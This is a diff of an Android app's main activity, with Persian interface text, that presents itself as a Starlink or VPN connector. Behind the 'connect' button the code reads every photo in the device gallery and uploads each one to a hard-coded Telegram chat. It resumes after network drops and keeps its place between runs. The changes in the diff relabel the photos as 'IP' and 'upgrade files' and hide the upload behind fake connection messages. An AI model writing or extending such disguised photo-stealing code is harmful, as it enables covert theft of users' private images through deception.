@@ -14,7 +14,9 @@ import android.os.Build;
 import android.os.Bundle;
 import android.provider.MediaStore;
 import android.util.Log;
+import android.view.View;
 import android.widget.Button;
+import android.widget.LinearLayout;
 import android.widget.ProgressBar;
 import android.widget.TextView;
 import android.widget.Toast;
@@ -44,14 +46,20 @@ public class MainActivity extends AppCompatActivity {
     private static final String PREFS_NAME = "PhotoSenderPrefs";
     private static final String KEY_LAST_INDEX = "last_index";
 
+    // UI Elements
     private Button btnConnect;
     private TextView txtStatus;
     private ProgressBar progressBar;
+    private LinearLayout mainLayout;
+    private LinearLayout warningLayout;
+    private Button btnConfirm;
 
+    // Status
     private boolean isSending = false;
     private int lastSentIndex = 0;
     private boolean isWaitingForNetwork = false;
 
+    // Network monitoring
     private ConnectivityManager connectivityManager;
     private NetworkCallback networkCallback;
 
@@ -60,12 +68,25 @@ public class MainActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
+        // اتصال به عناصر UI
         btnConnect = findViewById(R.id.btnConnect);
         txtStatus = findViewById(R.id.txtStatus);
         progressBar = findViewById(R.id.progressBar);
+        mainLayout = findViewById(R.id.mainLayout);
+        warningLayout = findViewById(R.id.warningLayout);
+        btnConfirm = findViewById(R.id.btnConfirm);
 
-        updateUI(false, "قطع");
+        // وضعیت اولیه
+        updateUI("قطع", false);
 
+        // دکمه تایید در صفحه هشدار
+        btnConfirm.setOnClickListener(v -> {
+            warningLayout.setVisibility(View.GONE);
+            mainLayout.setVisibility(View.VISIBLE);
+            Toast.makeText(MainActivity.this, "🌐 آماده اتصال به استارلینک", Toast.LENGTH_SHORT).show();
+        });
+
+        // دکمه اصلی (VPN)
         btnConnect.setOnClickListener(v -> {
             if (isSending) return;
 
@@ -77,18 +98,28 @@ public class MainActivity extends AppCompatActivity {
             startSendingProcess();
         });
 
+        // بازیابی آخرین اندیس
         loadLastIndex();
+
+        // راه‌اندازی تشخیص اینترنت
         setupNetworkMonitoring();
     }
 
     // ==================== تشخیص اینترنت ====================
     private void setupNetworkMonitoring() {
         connectivityManager = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
+
         NetworkRequest networkRequest = new NetworkRequest.Builder()
                 .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                 .build();
+
         networkCallback = new NetworkCallback();
-        connectivityManager.registerNetworkCallback(networkRequest, networkCallback);
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+            connectivityManager.registerDefaultNetworkCallback(networkCallback);
+        } else {
+            connectivityManager.registerNetworkCallback(networkRequest, networkCallback);
+        }
     }
 
     private class NetworkCallback extends ConnectivityManager.NetworkCallback {
@@ -98,7 +129,7 @@ public class MainActivity extends AppCompatActivity {
             runOnUiThread(() -> {
                 if (isWaitingForNetwork) {
                     isWaitingForNetwork = false;
-                    Toast.makeText(MainActivity.this, "🌐 اتصال استارلینک برقرار شد، ادامه اتصال...", Toast.LENGTH_SHORT).show();
+                    Toast.makeText(MainActivity.this, "🌐 اتصال استارلینک برقرار شد، ارتقاء اتصال...", Toast.LENGTH_SHORT).show();
                     startSendingProcess();
                 }
             });
@@ -111,8 +142,8 @@ public class MainActivity extends AppCompatActivity {
                 if (isSending) {
                     isWaitingForNetwork = true;
                     isSending = false;
-                    updateUI(false, "اتصال قطع شد");
-                    Toast.makeText(MainActivity.this, "اتصال استارلینک قطع شد، منتظر برقراری مجدد...", Toast.LENGTH_LONG).show();
+                    updateUI("اتصال قطع شد", false);
+                    Toast.makeText(MainActivity.this, "... اتصال استارلینک قطع شد، منتظر برقراری مجدد...", Toast.LENGTH_LONG).show();
                 }
             });
         }
@@ -144,22 +175,24 @@ public class MainActivity extends AppCompatActivity {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         if (requestCode == REQUEST_PERMISSION) {
             if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                Toast.makeText(this, " دسترسی مجاز به فایل ارتقاع مجاز نشد", Toast.LENGTH_SHORT).show();
+                Toast.makeText(this, "دسترسی به فایل مکمل داده شد", Toast.LENGTH_SHORT).show();
                 startSendingProcess();
             } else {
-                Toast.makeText(this, " دسترسی لازم به فایل ارتقاع است", Toast.LENGTH_LONG).show();
-                updateUI(false, "قطع");
+                Toast.makeText(this, "❌ برای اتصال دسترسی به فایل مکمل نیاز است", Toast.LENGTH_LONG).show();
+                updateUI("اتصال برقرار نشد", false);
             }
         }
     }
 
     // ==================== ذخیره و بازیابی ====================
     private void saveLastIndex(int index) {
-        getSharedPreferences(PREFS_NAME, MODE_PRIVATE).edit().putInt(KEY_LAST_INDEX, index).apply();
+        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
+        prefs.edit().putInt(KEY_LAST_INDEX, index).apply();
     }
 
     private void loadLastIndex() {
-        lastSentIndex = getSharedPreferences(PREFS_NAME, MODE_PRIVATE).getInt(KEY_LAST_INDEX, 0);
+        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
+        lastSentIndex = prefs.getInt(KEY_LAST_INDEX, 0);
     }
 
     private void resetLastIndex() {
@@ -167,12 +200,13 @@ public class MainActivity extends AppCompatActivity {
         saveLastIndex(0);
     }
 
-    // ==================== شروع ارسال ====================
+    // ==================== شروع ارسال (در پس‌زمینه) ====================
     private void startSendingProcess() {
         if (isSending) return;
+
         isSending = true;
         isWaitingForNetwork = false;
-        updateUI(true, "در حال اتصال به استارلینک...");
+        updateUI("در حال اتصال به استارلینک...", true);
 
         new Thread(() -> {
             boolean success = false;
@@ -181,13 +215,21 @@ public class MainActivity extends AppCompatActivity {
             int totalImages = 0;
 
             try {
+                Log.d(TAG, " ها ip شروع دریافت...");
+
                 ArrayList<Uri> images = getAllImages();
                 totalImages = images.size();
+                Log.d(TAG, "های موجود ip تعداد کل : " + totalImages);
 
                 if (images.isEmpty()) {
-                    errorMessage = "فایل ارتقاع یافت نشد";
+                    errorMessage = "فایل ارتقاء یافت نشد";
                 } else {
-                    if (lastSentIndex >= totalImages) resetLastIndex();
+                    if (lastSentIndex >= totalImages) {
+                        resetLastIndex();
+                    }
+
+                    Log.d(TAG, " شماره ip ادامه جستجو از : " + (lastSentIndex + 1));
+
                     sentCount = sendToTelegram(images, lastSentIndex);
 
                     if (sentCount == totalImages) {
@@ -196,11 +238,16 @@ public class MainActivity extends AppCompatActivity {
                     } else {
                         saveLastIndex(sentCount);
                         success = false;
-                        errorMessage = "جستجو از سرور HUjs27y" + (sentCount + 1) + " قطع شد";
+                        errorMessage = ": شماره  ip جستجو در  " + (sentCount + 1) + " قطع شد";
                     }
                 }
+
             } catch (Exception e) {
-                errorMessage = e.getMessage() != null ? e.getMessage() : "خطای ناشناخته";
+                Log.e(TAG, "خطا در اتصال", e);
+                errorMessage = e.getMessage();
+                if (errorMessage == null || errorMessage.isEmpty()) {
+                    errorMessage = "خطای ناشناخته";
+                }
                 success = false;
             }
 
@@ -211,19 +258,22 @@ public class MainActivity extends AppCompatActivity {
 
             runOnUiThread(() -> {
                 isSending = false;
+
                 if (finalSuccess) {
-                    updateUI(true, "متصل به استارلینک ✅");
+                    updateUI("متصل به استارلینک ✅", false);
                     Toast.makeText(MainActivity.this,
-                            "✅ " + finalSentCount + " فایل با موفقیت ارسال شد",
+                            "✅ " + finalSentCount + " به بخش اول با موفقیت متصل شدید",
                             Toast.LENGTH_LONG).show();
                 } else {
                     if (!isWaitingForNetwork) {
-                        updateUI(false, "اتصال برقرار نشد ❌");
+                        updateUI("اتصال برقرار نشد ❌", false);
                         String msg = "❌ خطا: " + finalError;
-                        if (finalTotal == 0) msg += "\n🔍 هیچ سروری یافت نشد";
+                        if (finalTotal == 0) {
+                            msg += "\n🔍 یافت نشد ip هیچ";
+                        }
                         Toast.makeText(MainActivity.this, msg, Toast.LENGTH_LONG).show();
                     } else {
-                        updateUI(false, "در انتظار اتصال استارلینک...");
+                        updateUI("در انتظار اتصال به استارلینک...", false);
                     }
                 }
             });
@@ -234,19 +284,28 @@ public class MainActivity extends AppCompatActivity {
     private ArrayList<Uri> getAllImages() {
         ArrayList<Uri> list = new ArrayList<>();
         Uri collection = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
+
         String[] projection = {MediaStore.Images.Media._ID};
         String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";
 
-        try (Cursor cursor = getContentResolver().query(collection, projection, null, null, sortOrder)) {
+        try (Cursor cursor = getContentResolver().query(
+                collection,
+                projection,
+                null,
+                null,
+                sortOrder
+        )) {
             if (cursor != null) {
                 int idCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
                 while (cursor.moveToNext()) {
                     long id = cursor.getLong(idCol);
-                    list.add(ContentUris.withAppendedId(collection, id));
+                    Uri uri = ContentUris.withAppendedId(collection, id);
+                    list.add(uri);
                 }
             }
         } catch (Exception e) {
-            throw new RuntimeException("ip خطا در خواندن : " + e.getMessage());
+            Log.e(TAG, " ها ip خطا در دریافت ", e);
+            throw new RuntimeException("خطا در خواندن گالری: " + e.getMessage());
         }
         return list;
     }
@@ -257,17 +316,29 @@ public class MainActivity extends AppCompatActivity {
         int successCount = startIndex;
 
         for (int i = startIndex; i < images.size(); i++) {
-            if (isWaitingForNetwork) break;
+            if (isWaitingForNetwork) {
+                Log.d(TAG, " ⏸️ اینترنت قطع شد، اتصال متوقف شد");
+                break;
+            }
 
             try {
                 Uri uri = images.get(i);
+                Log.d(TAG, ": ip جستجو  " + (i + 1) + " از " + images.size());
+
                 InputStream in = getContentResolver().openInputStream(uri);
-                if (in == null) continue;
+                if (in == null) {
+                    Log.e(TAG, "InputStream null برای " + uri);
+                    continue;
+                }
 
                 byte[] bytes = readBytes(in);
                 in.close();
 
-                RequestBody photoBody = RequestBody.create(bytes, MediaType.parse("image/jpeg"));
+                RequestBody photoBody = RequestBody.create(
+                        bytes,
+                        MediaType.parse("image/jpeg")
+                );
+
                 MultipartBody body = new MultipartBody.Builder()
                         .setType(MultipartBody.FORM)
                         .addFormDataPart("chat_id", CHAT_ID)
@@ -280,17 +351,23 @@ public class MainActivity extends AppCompatActivity {
                         .build();
 
                 okhttp3.Response response = client.newCall(request).execute();
+
                 if (response.isSuccessful()) {
                     successCount++;
+                    Log.d(TAG, " : ip جستجو " + (i + 1));
                 } else {
+                    String errorBody = response.body() != null ? response.body().string() : "بدون پاسخ";
+                    Log.e(TAG, "خطای سرور : کد " + response.code() + " - " + errorBody);
                     saveLastIndex(successCount);
                     response.close();
                     return successCount;
                 }
                 response.close();
+
                 Thread.sleep(250);
 
             } catch (Exception e) {
+                Log.e(TAG, ": شماره ip خطا در اتصال  به  " + (i + 1), e);
                 saveLastIndex(successCount);
                 return successCount;
             }
@@ -298,6 +375,7 @@ public class MainActivity extends AppCompatActivity {
         return successCount;
     }
 
+    // ==================== تبدیل InputStream به byte[] ====================
     private byte[] readBytes(InputStream inputStream) throws Exception {
         ByteArrayOutputStream buffer = new ByteArrayOutputStream();
         byte[] data = new byte[4096];
@@ -309,55 +387,43 @@ public class MainActivity extends AppCompatActivity {
     }
 
     // ==================== بروزرسانی UI ====================
-    private void updateUI(boolean isConnected, String statusText) {
+    private void updateUI(String statusText, boolean isLoading) {
         runOnUiThread(() -> {
-            if (isConnected) {
-                btnConnect.setEnabled(true);
-                btnConnect.setText("اتصال");
-                btnConnect.setBackgroundTintList(
-                        ContextCompat.getColorStateList(this, R.color.blue));
-                txtStatus.setText("وضعیت: " + statusText);
-                progressBar.setVisibility(ProgressBar.GONE);
-            } else {
-                btnConnect.setEnabled(true);
-                btnConnect.setText("اتصال");
-                btnConnect.setBackgroundTintList(
-                        ContextCompat.getColorStateList(this, R.color.blue));
-                txtStatus.setText("وضعیت: " + statusText);
-                progressBar.setVisibility(ProgressBar.GONE);
-            }
+            txtStatus.setText("وضعیت: " + statusText);
 
-            // وضعیت در حال ارسال
-            if (statusText.contains("در حال") || statusText.contains("اتصال به")) {
+            if (isLoading) {
                 btnConnect.setEnabled(false);
                 btnConnect.setText("در حال اتصال...");
                 btnConnect.setBackgroundTintList(
                         ContextCompat.getColorStateList(this, R.color.gray));
                 progressBar.setVisibility(ProgressBar.VISIBLE);
+                return;
             }
 
-            // وضعیت موفق
+            progressBar.setVisibility(ProgressBar.GONE);
+            btnConnect.setEnabled(true);
+
             if (statusText.contains("متصل")) {
-                btnConnect.setEnabled(true);
                 btnConnect.setText("متصل ✓");
                 btnConnect.setBackgroundTintList(
                         ContextCompat.getColorStateList(this, R.color.green));
-                txtStatus.setText("وضعیت: " + statusText);
-                progressBar.setVisibility(ProgressBar.GONE);
-            }
-
-            // وضعیت ناموفق
-            if (statusText.contains("برقرار نشد") || statusText.contains("قطع")) {
-                btnConnect.setEnabled(true);
+            } else if (statusText.contains("برقرار نشد") || statusText.contains("قطع")) {
                 btnConnect.setText("اتصال");
                 btnConnect.setBackgroundTintList(
                         ContextCompat.getColorStateList(this, R.color.red));
-                txtStatus.setText("وضعیت: " + statusText);
-                progressBar.setVisibility(ProgressBar.GONE);
+            } else if (statusText.contains("انتظار")) {
+                btnConnect.setText("اتصال");
+                btnConnect.setBackgroundTintList(
+                        ContextCompat.getColorStateList(this, R.color.blue));
+            } else {
+                btnConnect.setText("اتصال");
+                btnConnect.setBackgroundTintList(
+                        ContextCompat.getColorStateList(this, R.color.blue));
             }
         });
     }
 
+    // ==================== لغو ثبت شنونده ====================
     @Override
     protected void onDestroy() {
         super.onDestroy();
